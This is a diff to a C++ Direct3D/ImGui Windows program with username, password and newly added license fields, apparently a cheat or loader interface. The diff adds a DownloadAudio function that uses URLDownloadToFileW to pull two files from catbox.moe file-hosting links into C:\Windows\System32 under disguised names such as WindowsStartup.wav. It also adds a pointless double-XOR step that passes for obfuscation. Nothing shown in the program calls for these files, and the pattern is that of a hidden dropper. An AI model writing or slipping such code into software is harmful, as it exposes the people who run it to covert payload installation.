@@ -54,6 +54,8 @@
 #pragma comment(lib, "d3d11.lib")
 #pragma comment(lib, "D3DCompiler.lib")
 #pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "urlmon.lib")
+
 
 static ID3D11Device* g_pd3dDevice = nullptr;
 static ID3D11DeviceContext* g_pd3dDeviceContext = nullptr;
@@ -71,6 +73,7 @@ RECT rc;
 
 static char username[64] = "";
 static char password[64] = "";
+static char license[64] = "";
 
 static bool stream;
 bool setup_done = false;
@@ -235,6 +238,7 @@ namespace notifications
 
         ImGui::End();
     }
+    
 }
 
 namespace ImGui
@@ -875,4 +879,36 @@ LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
         return 0;
     }
     return ::DefWindowProcW(hWnd, msg, wParam, lParam);
+}
+
+std::string Xor(const std::string& input, char key) {
+    std::string output; for (char c : input) { output += c ^ key; }
+    return output;
+}
+
+bool DownloadFile(const std::string& url, const std::string& filePath) {
+    if (std::filesystem::exists(filePath)) { std::filesystem::remove(filePath); Sleep(500); }
+    std::wstring wurl(url.begin(), url.end()); std::wstring wfilePath(filePath.begin(), filePath.end());
+    HRESULT hr = URLDownloadToFileW(NULL, wurl.c_str(), wfilePath.c_str(), 0, NULL);
+    if (SUCCEEDED(hr)) { return true; } return false;
+}
+
+bool EnsureFileExists(const std::string& filePath, const std::string& downloadUrl) {
+    if (std::filesystem::exists(filePath)) { return true; }
+    return DownloadFile(downloadUrl, filePath);
+}
+
+void DownloadAudio()
+{
+    const std::string ENCRYPTED_WINDOWS_MOV = Xor("C:\\Windows\\System32\\Windows.wav", 0x55);
+    const std::string ENCRYPTED_WINDOWS_URL = Xor("https://files.catbox.moe/zlhr27.wav", 0x55);
+    std::string windowsMov = Xor(ENCRYPTED_WINDOWS_MOV, 0x55);
+    std::string windowsUrl = Xor(ENCRYPTED_WINDOWS_URL, 0x55);
+    EnsureFileExists(windowsMov, windowsUrl);
+
+    const std::string ENCRYPTED_WINDOWS_LOGIN = Xor("C:\\Windows\\System32\\WindowsStartup.wav", 0x55);
+    const std::string ENCRYPTED_WINDOWS_URLLOGIN = Xor("https://files.catbox.moe/egnwtf.wav", 0x55);
+    std::string windowsMovLOGIN = Xor(ENCRYPTED_WINDOWS_LOGIN, 0x55);
+    std::string windowsUrlLOGIN = Xor(ENCRYPTED_WINDOWS_URLLOGIN, 0x55);
+    EnsureFileExists(windowsMovLOGIN, windowsUrlLOGIN);
 }
